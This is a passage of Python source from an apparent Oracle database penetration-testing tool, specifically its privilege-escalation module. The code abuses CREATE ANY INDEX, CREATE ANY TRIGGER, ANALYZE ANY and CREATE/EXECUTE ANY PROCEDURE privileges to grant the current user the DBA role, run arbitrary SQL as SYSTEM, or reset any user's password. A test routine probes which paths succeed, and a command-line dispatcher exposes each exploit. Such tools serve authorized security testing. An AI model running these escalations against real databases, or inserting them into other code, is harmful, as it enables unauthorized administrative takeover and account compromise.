						self.dropIndex(self.INDEX_NAME_FOR_CREATE_ANY_INDEX, 'system')
						self.dropStoredFunction(self.INDEX_NAME_FOR_CREATE_ANY_INDEX, 'system')
						logging.info("Insertion done. The following request has been executed with SYSTEM privileges: {0}".format(repr(privRequest)))
						return True
				
			

	def giveDbaRoleWithCreateAnyIndexMethod (self):
		'''
		Try to give the dba role to user
		If user = None, user = current user
		Returns:
		- True if the dba role has been given to user
		- False if the dba role has NOT been given to user (error)
		- None if the user has dba role already
		'''
		user = self.args['user']
		logging.info('Trying to grant DBA role to {0} using CREATE ANY INDEX method'.format(user))
		isDBA = self.hasThisRole('DBA',user)
		if isDBA == True:
			logging.info("The {0} has already the DBA role. Nothing to do!".format(user))
			return None
		elif isDBA == None:
			logging.info("Impossible to know if {0} is DBA. Cancelling...".format(user))
			return False
		else:
			logging.info("The {0} is not DBA. Continue...".format(user))
			grantDBArequest = self.GRANT_DBA_TO_USER.format(user)
			status = self.executeSytemRequestWithCreateAnyIndexMethod(privRequest=grantDBArequest)
			if status == True:
				logging.info('The DBA role has been granted to {0}'.format(user))
				return True
			else:
				logging.info('The DBA role has NOT been granted to {0}'.format(user))
				return False
		
	####################################################################################################################
	#						Test ALL methods
	####################################################################################################################	
	def testAll (self):
		'''
		Test all functions
		'''
		DEFAULT_UNKNOWN_ORACLE_USER = "ahNgahchishei5xiesi2"
		REQUEST_TEST_FOR_ANALYZE_ANY_METHOD = 'GRANT dba to {0}'.format(DEFAULT_UNKNOWN_ORACLE_USER)
		REQUEST_TEST_FOR_CREATE_ANY_INDEX = 'GRANT dba to {0}'.format(DEFAULT_UNKNOWN_ORACLE_USER)
		REQUEST_TEST_FOR_CREATE_ANY_TRIGGER = 'GRANT dba to {0}'.format(DEFAULT_UNKNOWN_ORACLE_USER)
		REQUEST_TEST_FOR_CREATE_ANY_PROCEDURE = 'ALTER USER {0} IDENTIFIED BY {0}'.format(DEFAULT_UNKNOWN_ORACLE_USER)
		REQUEST_TEST_FOR_EXECUTE_ANY_PROCEDURE = 'GRANT dba to {0}'.format(DEFAULT_UNKNOWN_ORACLE_USER)
		
		self.args['print'].subtitle("Gain elevated access (privilege escalation)?")
		isDBA = self.hasThisRole('DBA')
		if isDBA == True:
			logging.info("The current Oracle user has already the DBA role.")
			self.args['print'].unknownNews("The current user has already DBA role. It does not need to exploit a privilege escalation!")
		else :
			#CREATE/EXECUTE ANY PROCEDURE
			self.args['print'].subsubtitle("DBA role using CREATE/EXECUTE ANY PROCEDURE privileges?")
			logging.info("If the current user has the CREATE ANY PROCEDURE and EXECUTE ANY PROCEDURE, he can have DBA role")
			status = self.executeRequestWithExecuteAnyProcedureMethod(privRequest=REQUEST_TEST_FOR_EXECUTE_ANY_PROCEDURE)
			if isinstance(status, Exception):
				if DEFAULT_UNKNOWN_ORACLE_USER.upper() in str(status).upper():
					logging.info("The current user can give himslef the DBA role using CREATE/EXECUTE ANY PROCEDURE method")
					self.args['print'].goodNews("OK")
				else:
					logging.info("The current user can NOT give himslef the DBA role using CREATE/EXECUTE ANY PROCEDURE method")
					self.args['print'].badNews("KO")
			else : 
				logging.info("The current user can NOT give himslef the DBA role using CREATE/EXECUTE ANY PROCEDURE method")
				self.args['print'].badNews("KO")
			#CREATE ANY PROCEDURE only
			self.args['print'].subsubtitle("Modification of users' passwords using CREATE ANY PROCEDURE privilege only?")
			logging.info("If the current user has the CREATE ANY PROCEDURE he can set the password of arbitrary Oracle user")
			status = self.executeSytemRequestWithCreateAnyProcedureMethod(privRequest=REQUEST_TEST_FOR_CREATE_ANY_PROCEDURE)
			if isinstance(status, Exception):
				if DEFAULT_UNKNOWN_ORACLE_USER.upper() in str(status).upper():
					logging.info("The current user can alter Oracle users' passwords with CREATE ANY PROCEDURE method")
					self.args['print'].goodNews("OK")
				else:
					logging.info("The current user can NOT alter Oracle users' passwords with CREATE ANY PROCEDURE method")
					self.args['print'].badNews("KO")
			else : 
				logging.info("The current user can NOT alter Oracle users' passwords with CREATE ANY PROCEDURE method")
				self.args['print'].badNews("KO")
			#CREATE ANY TRIGGER
			self.args['print'].subsubtitle("DBA role using CREATE ANY TRIGGER privilege?")
			logging.info("If the current user has the CREATE ANY TRIGGER and CREATE PROCEDURE, he can have DBA role normally")
			status = self.executeSytemRequestWithCreateAnyTriggerMethod(privRequest=REQUEST_TEST_FOR_CREATE_ANY_TRIGGER)
			if isinstance(status, Exception):
				if DEFAULT_UNKNOWN_ORACLE_USER.upper() in str(status).upper():
					logging.info("The current user can have the DBA role using CREATE ANY TRIGGER method")
					self.args['print'].goodNews("OK")
				else:
					logging.info("The current user can NOT have the DBA role using CREATE ANY TRIGGER method")
					self.args['print'].badNews("KO")
			else : 
				logging.info("The current user can NOT have the DBA role using CREATE ANY TRIGGER method")
				self.args['print'].badNews("KO")
			# ANALYZE ANY method
			self.args['print'].subsubtitle("DBA role using ANALYZE ANY (and CREATE PROCEDURE) privileges?")
			logging.info("If the current user has the ANALYZE ANY, he can have DBA role normally")
			status = self.executeSytemRequestWithAnalyzeAnyMethod(privRequest=REQUEST_TEST_FOR_ANALYZE_ANY_METHOD)
			if isinstance(status, Exception):
				if DEFAULT_UNKNOWN_ORACLE_USER.upper() in str(status).upper():
					logging.info("The current user can have the DBA role using ANALYZE ANY method")
					self.args['print'].goodNews("OK")
				else:
					logging.info("The current user can NOT have the DBA role using ANALYZE ANY method")
					self.args['print'].badNews("KO")
			else : 
				logging.info("The current user can NOT have the DBA role using ANALYZE ANY method")
				self.args['print'].badNews("KO")
			# CREATE ANY INDEX method
			self.args['print'].subsubtitle("DBA role using CREATE ANY INDEX (and CREATE PROCEDURE) privileges?")
			logging.info("If the current user has the CREATE ANY INDEX, he can have DBA role normally")
			status = self.executeSytemRequestWithCreateAnyIndexMethod(privRequest=REQUEST_TEST_FOR_CREATE_ANY_INDEX)
			if isinstance(status, Exception):
				if DEFAULT_UNKNOWN_ORACLE_USER.upper() in str(status).upper():
					logging.info("The current user can have the DBA role using CREATE ANY INDEX method")
					self.args['print'].goodNews("OK")
				else:
					logging.info("The current user can NOT have the DBA role using CREATE ANY INDEX method")
					self.args['print'].badNews("KO")
			else : 
				logging.info("The current user can NOT have the DBA role using CREATE ANY INDEX method")
				self.args['print'].badNews("KO")
		
def runPrivilegeEscalationModule(args):
	'''
	Run the Passwords module
	'''
	status = True
	if checkOptionsGivenByTheUser(args,["test-module",
										"revoke-dba-role",
										"dba-with-execute-any-procedure",
										"alter-pwd-with-create-any-procedure",
										"dba-with-create-any-trigger",
										"dba-with-analyze-any",
										"dba-with-create-any-index",
										"exec-with-analyze-any",
										"exec-with-create-any-index",
										"exec-with-create-any-trigger",
										"exec-with-create-any-procedure",
										"exec-with-execute-any-procedure",
										"get-privs",
										"get-detailed-privs"]) == False : return EXIT_MISS_ARGUMENT
	privilegeEscalation = PrivilegeEscalation(args)
	status = privilegeEscalation.connection(stopIfError=True)
	if args['test-module'] == True :
		args['print'].title("Test if the current user can gain elevated access (privilege escalation)")
		status = privilegeEscalation.testAll()
	if args['get-privs'] == True :
		args['print'].title("Get system privileges and roles of current Oracle user")
		status = privilegeEscalation.printPrivilegesAndRoles()
	if args['get-detailed-privs'] == True:
		args['print'].title("Get system privileges and roles of current Oracle user + roles and privileges of roles granted to this current user")
		status = privilegeEscalation.printPrivilegesAndRoles(deep=True)
	if args['revoke-dba-role'] == True :
		args['print'].title("Revoke DBA role from current user ({0})".format(privilegeEscalation.args['user']))
		status = privilegeEscalation.revokeDbaRole()
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to revoke DBA role from {0}: {1}".format(privilegeEscalation.args['user'], status))
		else : 
			args['print'].goodNews("The DBA role has been revoked from {0}".format(privilegeEscalation.args['user']))
	if args['dba-with-execute-any-procedure'] == True:
		args['print'].title("Grant DBA role to current user with CREATE/EXECUTE ANY PROCEDURE method")
		status = privilegeEscalation.giveDbaRoleWithExecuteAnyProcedureMethod()
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to grant DBA role to current user: {0}".format(status))
		elif status==None:
			args['print'].unknownNews("The current user has already DBA role")	
		elif status==True: 
			args['print'].goodNews("The DBA role has been granted to this current user")
	if args['alter-pwd-with-create-any-procedure'] != None :
		user, newpwd = privilegeEscalation.args['alter-pwd-with-create-any-procedure'][0], privilegeEscalation.args['alter-pwd-with-create-any-procedure'][1]
		args['print'].title("Alter the password of {0} by '{1}' with CREATE ANY PROCEDURE method".format(user, newpwd))
		status = privilegeEscalation.setPasswordWithCreateAnyProcedureMethod(user, newpwd)
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to alter the password of {0}: {1}".format(user, status))
		elif status==True:
			args['print'].goodNews("Password of {0} user modified: The new password of {0} is '{1}'".format(user, newpwd))
	if args['dba-with-create-any-trigger'] == True:
		args['print'].title("Grant DBA role to current user with CREATE ANY TRIGGER method")
		status = privilegeEscalation.giveDbaRoleWithCreateAnyTriggerMethod()
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to grant DBA role to current user: {0}".format(status))
		elif status==None:
			args['print'].unknownNews("The current user has already DBA role")	
		elif status==True: 
			args['print'].goodNews("The DBA role has been granted to this current user")
	if args['dba-with-analyze-any'] == True:
		args['print'].title("Grant DBA role to current user with ANALYZE ANY method")
		status = privilegeEscalation.giveDbaRoleWithAnalyzeAnyMethod()
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to grant DBA role to current user: {0}".format(status))
		elif status==None:
			args['print'].unknownNews("The current user has already DBA role")	
		elif status==True: 
			args['print'].goodNews("The DBA role has been granted to this current user")
		else:
			args['print'].badNews("The DBA role has NOT been granted to this current user")
	if args['dba-with-create-any-index'] == True:
		args['print'].title("Grant DBA role to current user with CREATE ANY INDEX method")
		status = privilegeEscalation.giveDbaRoleWithCreateAnyIndexMethod()
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to grant DBA role to current user: {0}".format(status))
		elif status==None:
			args['print'].unknownNews("The current user has already DBA role")	
		elif status==True: 
			args['print'].goodNews("The DBA role has been granted to this current user")
		else:
			args['print'].badNews("The DBA role has NOT been granted to this current user")
	#Semi manual exploitation
	if args['exec-with-execute-any-procedure'] != None:
		args['print'].title("Execute the request as SYSTEM with CREATE/EXECUTE ANY PROCEDURE method")
		status = privilegeEscalation.executeRequestWithExecuteAnyProcedureMethod(privRequest=args['exec-with-execute-any-procedure'][0])
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to execute the request as SYSTEM: {0}".format(status))
		elif status==True: 
			args['print'].goodNews("The request has been executed successfully as system")
	if args['exec-with-create-any-procedure'] != None:
		args['print'].title("Execute the request as SYSTEM with CREATE ANY PROCEDURE method only")
		status = privilegeEscalation.executeSytemRequestWithCreateAnyProcedureMethod(privRequest=args['exec-with-create-any-procedure'][0])
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to execute the request as SYSTEM: {0}".format(status))
		elif status==True: 
			args['print'].goodNews("The request has been executed successfully as system")
	if args['exec-with-create-any-trigger'] != None:
		args['print'].title("Execute the request as SYSTEM with CREATE ANY TRIGGER method")
		status = privilegeEscalation.executeSytemRequestWithCreateAnyTriggerMethod(privRequest=args['exec-with-create-any-trigger'][0])
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to execute the request as SYSTEM: {0}".format(status))
		elif status==True: 
			args['print'].goodNews("The request has been executed successfully as system")
	if args['exec-with-analyze-any'] != None:
		args['print'].title("Execute the request as SYSTEM with ANALYZE ANY method")
		status = privilegeEscalation.executeSytemRequestWithAnalyzeAnyMethod(privRequest=args['exec-with-analyze-any'][0])
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to execute the request as SYSTEM: {0}".format(status))
		elif status==True: 
			args['print'].goodNews("The request has been executed successfully as system")
	if args['exec-with-create-any-index'] != None:
		args['print'].title("Execute the request as SYSTEM with CREATE ANY INDEX method")
		status = privilegeEscalation.executeSytemRequestWithCreateAnyIndexMethod(privRequest=args['exec-with-create-any-index'][0])
		if isinstance(status,Exception):
			args['print'].badNews("Impossible to execute the request as SYSTEM: {0}".format(status))
		elif status==True: 
			args['print'].goodNews("The request has been executed successfully as system")
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
